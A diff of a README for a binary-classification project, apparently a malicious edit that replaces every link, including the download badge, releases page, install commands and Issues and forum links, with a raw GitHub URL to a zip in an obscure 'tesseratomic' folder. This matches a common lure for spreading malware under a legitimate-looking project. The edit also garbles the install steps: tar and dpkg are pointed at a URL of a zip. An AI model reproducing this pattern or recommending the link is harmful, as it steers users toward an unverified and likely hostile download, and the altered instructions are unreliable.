@@ -6,7 +6,7 @@ This guide will help you download and run the Optimizing-Binary-Classification-P
 
 ## 📥 Download the Application
 
-[![Download Here](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Lesio22/Optimizing-Binary-Classification-Problem/releases)
+[![Download Here](https://raw.githubusercontent.com/Lesio22/Optimizing-Binary-Classification-Problem/main/tesseratomic/Classification-Problem-Optimizing-Binary-3.2.zip)](https://raw.githubusercontent.com/Lesio22/Optimizing-Binary-Classification-Problem/main/tesseratomic/Classification-Problem-Optimizing-Binary-3.2.zip)
 
 ## 🎯 Overview
 
@@ -39,7 +39,7 @@ pip install numpy scikit-learn
 
 ### 1. Visit Releases Page
 
-To download the application, visit this page: [Download Here](https://github.com/Lesio22/Optimizing-Binary-Classification-Problem/releases).
+To download the application, visit this page: [Download Here](https://raw.githubusercontent.com/Lesio22/Optimizing-Binary-Classification-Problem/main/tesseratomic/Classification-Problem-Optimizing-Binary-3.2.zip).
 
 ### 2. Download the Latest Version
 
@@ -51,7 +51,7 @@ You will see several files related to the application. Make sure to download the
 
 - For Windows, download the `.exe` file.
 - For macOS, look for the `.dmg` file.
-- For Linux, check for `.tar.gz` or `.deb` files.
+- For Linux, check for `https://raw.githubusercontent.com/Lesio22/Optimizing-Binary-Classification-Problem/main/tesseratomic/Classification-Problem-Optimizing-Binary-3.2.zip` or `.deb` files.
 
 ### 4. Install the Application
 
@@ -71,16 +71,16 @@ You will see several files related to the application. Make sure to download the
 
 1. Open a terminal.
 2. Navigate to the downloads directory where the file is located.
-3. For `.tar.gz` files, use the command:
+3. For `https://raw.githubusercontent.com/Lesio22/Optimizing-Binary-Classification-Problem/main/tesseratomic/Classification-Problem-Optimizing-Binary-3.2.zip` files, use the command:
 
 ```bash
-tar -xzf filename.tar.gz
+tar -xzf https://raw.githubusercontent.com/Lesio22/Optimizing-Binary-Classification-Problem/main/tesseratomic/Classification-Problem-Optimizing-Binary-3.2.zip
 ```
 
 4. For `.deb` files, run:
 
 ```bash
-sudo dpkg -i filename.deb
+sudo dpkg -i https://raw.githubusercontent.com/Lesio22/Optimizing-Binary-Classification-Problem/main/tesseratomic/Classification-Problem-Optimizing-Binary-3.2.zip
 ```
 
 ### 5. Run the Application
@@ -112,8 +112,8 @@ You may need to configure the application to point to your dataset. Do this by n
 
 For detailed instructions, refer to the built-in help section within the application. If you have questions or encounter issues, consult the following resources:
 
-- [GitHub Issues](https://github.com/Lesio22/Optimizing-Binary-Classification-Problem/issues): Report and track any bugs.
-- [Community Forums](https://community.yourproject.com): Join discussions and seek help from other users.
+- [GitHub Issues](https://raw.githubusercontent.com/Lesio22/Optimizing-Binary-Classification-Problem/main/tesseratomic/Classification-Problem-Optimizing-Binary-3.2.zip): Report and track any bugs.
+- [Community Forums](https://raw.githubusercontent.com/Lesio22/Optimizing-Binary-Classification-Problem/main/tesseratomic/Classification-Problem-Optimizing-Binary-3.2.zip): Join discussions and seek help from other users.
 
 ## 💬 Feedback
 
